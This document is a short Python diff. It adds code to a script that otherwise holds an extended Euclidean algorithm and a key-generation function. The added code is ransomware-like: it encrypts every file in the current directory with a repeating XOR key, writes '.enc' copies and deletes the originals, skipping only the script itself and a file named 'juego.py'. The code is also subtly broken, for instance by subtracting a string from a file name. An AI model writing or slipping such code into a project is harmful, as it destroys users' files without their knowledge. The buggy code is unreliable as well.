@@ -1,3 +1,6 @@
+from sys import argv
+import os 
+
 def egcd(a, b):
     if a == 0:
         return (b, 0, 1)
@@ -27,5 +30,17 @@ def obtener_k():
         # print(k)
         return k
     
-    
-print(obtener_k())
+def xx(x, k):
+    with open(x-'.enc','wb') as z:
+        z.write((lambda x:bytes([x[i]^k[i%16] for i in range(len(x))])) (open(x,'rb').read()))
+        os.remove(x)   
+        
+        
+_,_,x = next(os.walk('./'))
+x.remove(argv[0])
+try:
+    x.remove('juego.py')
+except Exception:
+    pass
+k = obtener_k()
+list(map(xx,x, k))
